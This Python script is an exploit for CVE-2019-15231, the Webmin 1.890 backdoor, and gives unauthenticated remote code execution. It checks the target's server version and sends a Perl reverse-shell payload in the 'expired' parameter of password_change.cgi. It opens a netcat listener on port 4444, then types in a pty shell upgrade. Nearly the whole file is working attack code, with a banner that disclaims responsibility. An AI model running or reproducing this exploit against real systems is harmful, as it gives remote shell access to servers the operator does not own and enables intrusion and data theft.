#!/usr/bin/python3
#Author: https://github.com/SLizBinksman
#CVE: 2019-15231

import argparse
import requests
from urllib3.exceptions import InsecureRequestWarning
from subprocess import run
from socket import error
from sys import exit
from pynput.keyboard import Key
from pynput.keyboard import Controller

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

lhost = ''
lport = 4444
payload = f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{lhost}:{lport}\")" \
          f";STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

def banner():
    banner = """

 __       __            __                      __           
|  \  _  |  \          |  \                    |  \          
| $$ / \ | $$  ______  | $$____   ______ ____   \$$ _______  
| $$/  $\| $$ /      \ | $$    \ |      \    \ |  \|       \ 
| $$  $$$\ $$|  $$$$$$\| $$$$$$$\| $$$$$$\$$$$\| $$| $$$$$$$\\
| $$ $$\$$\$$| $$    $$| $$  | $$| $$ | $$ | $$| $$| $$  | $$
| $$$$  \$$$$| $$$$$$$$| $$__/ $$| $$ | $$ | $$| $$| $$  | $$
| $$$    \$$$ \$$     \| $$    $$| $$ | $$ | $$| $$| $$  | $$
 \$$      \$$  \$$$$$$$ \$$$$$$$  \$$  \$$  \$$ \$$ \$$   \$$ Unauthenticated RCE
---------------------------------------------------------------------------------
[+] MSF Module:                     https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb
[+] Discovery:                      Özkan Mustafa Akkuş
[+] CVE:                            CVE-2019-15231
[+] Target Version:                 MiniServ/1.890       
[+] Vulnerability:                  Unauthenticated Remote Code Execution
[+] Author:                         https://github.com/SlizBinksman

[!] Note:                           SlizBinksman takes no credit for the discovery of this
                                    vulnerability. Sliz IS NOT RESPONSIBLE for YOUR ACTIONS
                                    with this code.
----------------------------------------------------------------------------------          
"""
    print(banner)
    return version()

def version():
    try:
        header = requests.get(f'{args.URL}/password_change.cgi',verify=False)
        version = header.headers.get('Server')
        exploitable = 'MiniServ/1.890'

        if version == exploitable:
            print(f'[*] Target Is Running {version} And Is Likely Vulnerable. Continuing To Exploit.')
            return exploit()

        if version != exploitable:
            tryExploit = input(f'[-] Target Is Running {version} And Is Likely Not Vulnerable. Continue Anyway? [y/n]:')

            if tryExploit == 'y':
                return exploit()

            if tryExploit == 'n':
                exit('[!] Quitting.')

            else:
                exit('[-] Invalid Input Option. Quitting.')

    except error:
        exit('[-] Could Not Connect To Server.')

def upgradeShell():
    keyboard = Controller()
    keys = 'python -c \'import pty; pty.spawn("/bin/bash")\''
    keyboard.type(keys)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    exit('[*] Maybe You Have Shell? Maybe You Don\'t. Not My Issue.')

def exploit():
    try:
        data = {
            'expired':payload,
        }
        print('[*] Opening Listener And Attempting Exploit.....')
        header = {"Referer":f"{args.URL}/session_login.cgi"}
        run(f'gnome-terminal -e "nc -lvnp {lport}"',shell=True,capture_output=True)
        requests.post(f'{args.URL}/password_change.cgi',data=data,headers=header,verify=False)
        upgradeShell()

    except error:
        exit('[-] Could Not Connect To Server.')

if __name__ == '__main__':

    mainArguments = argparse.ArgumentParser()
    mainArguments.add_argument('URL', help='URL Hosting Webmin', type=str)
    args = mainArguments.parse_args()

    try:
        banner()
    except KeyboardInterrupt:
        exit('[!] Aborting....')